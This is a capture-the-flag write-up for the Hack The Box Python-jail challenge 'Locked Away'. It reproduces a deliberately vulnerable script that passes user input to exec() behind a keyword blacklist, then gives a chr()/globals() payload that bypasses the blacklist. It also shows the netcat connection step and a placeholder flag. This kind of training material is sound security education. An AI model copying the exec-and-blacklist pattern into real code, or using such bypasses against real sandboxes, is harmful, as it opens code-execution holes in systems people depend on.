---
title: Locked Away - Hack The Box
date: 2025-01-05
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Locked Away

## Challenge Description

A test! Getting onto the team is one thing, but you must prove your skills to be chosen to represent the best of the
best. They have given you the classic - a restricted environment, devoid of functionality, and it is up to you to see
what you can do. Can you break open the chest? Do you have what it takes to bring humanity from the brink?

## Challenge Overview

The challenge provides the following Python script:

```python
banner = r'''
.____                  __              .___    _____                        
|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \<   |  |
|    |__(  <_> )  \___|    <\  ___// /_/ |  /    |    \     /  / __ \\___  |
|_______ \____/ \___  >__|_ \\___  >____ |  \____|__  /\/\_/  (____  / ____|
        \/          \/     \/    \/     \/          \/             \/\/     
'''


def open_chest():
    with open('flag.txt', 'r') as f:
        print(f.read())


blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'flag', 'txt', 'read', 'eval', 'exec',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', '\'', 'open'
]
print(banner)

while True:
    command = input('The chest lies waiting... ')

    if any(b in command for b in blacklist):
        print('Invalid command!')
        continue

    try:
        exec(command)
    except Exception as e:
        print(e)
        print('You have been locked away...')
        exit(1337)
```

### Observations

1. **Target Functionality**:  
   The `open_chest` function is the key to retrieving the flag, as it reads and prints the content of the `flag.txt`
   file. However, this function cannot be directly executed because:
    - `exec(command)` enforces a blacklist that blocks specific keywords like `open`, `flag`, `eval`, `exec`, etc.

2. **Blacklisting Mechanism**:  
   The `blacklist` array ensures that any input containing restricted words is rejected, preventing direct use of
   sensitive commands.

3. **Vulnerability**:  
   The `exec` function dynamically executes the input command, leaving it susceptible to clever bypass techniques.

## Bypassing the Blacklist

To execute `open_chest` and bypass the blacklist, we must:

1. **Avoid Using Blocked Words**:  
   Directly typing `open_chest()` is invalidated by the blacklist because `open` is restricted.

2. **Leverage `globals`**:  
   The `globals()` function returns a dictionary containing all global variables, including the `open_chest` function.
   Using `globals().get()` allows indirect access to the function without typing its name directly.

3. **Reconstruct the Function Name**:  
   Since the word `open` is restricted, we can reconstruct the string `open_chest` character by character using ASCII
   values.
    - Use the `ord` function to get the ASCII value of each character.
    - Use the `chr` function to convert ASCII values back to characters.

### Payload Construction

The following payload reconstructs `open_chest` and executes it:

```python
globals().get(chr(111) + chr(112) + chr(101) + chr(110) + chr(95) + chr(99) + chr(104) + chr(101) + chr(115) + chr(116))()
```

::: info Explanation

1. **Reconstruction**:
    - `chr(111)` converts ASCII `111` to `o`.
    - `chr(112)` converts ASCII `112` to `p`, and so on.
    - Concatenating these characters recreates the string `open_chest`.

2. **Function Retrieval**:
    - `globals().get("open_chest")` retrieves the `open_chest` function from the global namespace.

3. **Execution**:
    - Adding `()` at the end calls the function, bypassing the blacklist.

:::

## Exploitation Process

1. Connect to the challenge server using netcat:
   ```bash
   nc <ip> <port>
   ```

2. Submit the crafted payload:
   ```python
   globals().get(chr(111) + chr(112) + chr(101) + chr(110) + chr(95) + chr(99) + chr(104) + chr(101) + chr(115) + chr(116))()
   ```

3. Retrieve the flag from the server's response:
   ```plaintext
   HTB{f4k3_fLaG_f0r_t3sTiNg}
   ```

<ChallengeCard
    challengeType="misc"
    challengeName="Locked Away"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/717"
/>
